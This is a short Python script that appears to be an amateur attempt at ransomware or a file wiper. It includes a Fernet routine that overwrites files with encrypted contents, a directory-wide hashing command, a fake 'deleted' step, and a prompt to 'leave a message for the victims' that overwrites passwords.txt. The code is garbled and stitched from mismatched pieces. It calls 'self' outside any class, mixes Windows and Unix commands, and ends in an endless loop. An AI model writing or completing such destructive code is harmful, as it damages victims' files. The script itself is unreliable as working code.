import hashlib
import os

#time function


#define sha encode
def sha():
  File = input('target file: ')
  check = open(File, 'rb')
  with open(File, 'rb') as r:
    data = r.read()
    print('')
    os.system('clear')
    print('file data shown below:')
    print('')
    print(data)
    _data = hashlib.sha256(data.strip()).hexdigest()
    print('')
    print(_data in 'passwords.txt')
      # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
def crypt_file(self, file_path, encrypted=False):
    with open(file_path, 'rb') as f:
        # Read data from file
        data = f.read()
        if not encrypted:
                # Print file contents - [debugging]
          print(data)
          # Encrypt data from file
          _data = self.crypter.encrypt(data)
          # Log file encrypted and print encrypted contents - [debugging]
          print('> File encrpyted')
          print(_data)
        else:
            # Decrypt data from file
            _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
            print('> File decrpyted')
            print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)

      
  #print('this is the file data: ' + data)
sha()
#os.system('clear')
print('')
#define function that opens the existing file
#after it opens the target file it will extract the target file contents
run = 1
if run == 1:
  def extract():
    xtra =  input('to extract text from file type target file name: ')
    extract = open(xtra, 'rb')
    os.system('find -type f -exec md5sum {} \; > extraction.local')
extract()
os.system('clear')
print('')

#define function that extracts the txt

def execute():
    word2 = input('to confirm retype target file: ')
    RB = open(word2, 'rb')
    rb2 = RB.close()
    print('')
    print('deleted')
    os.system('clear')
    #os.system(word2)
execute()

#define a 2 hour time function

#define a function that leaves a message for the victim
def leave_message():
    message = input('leave a message for the victims: ')
    #message leaver
    leave = os.system('type "files are deleted" > passwords.txt')
    #os.system('find type "files are deleted"')
leave_message()
#success function
def complete():
  while leave_message:
    print('target file terminated')
complete()
#close all files
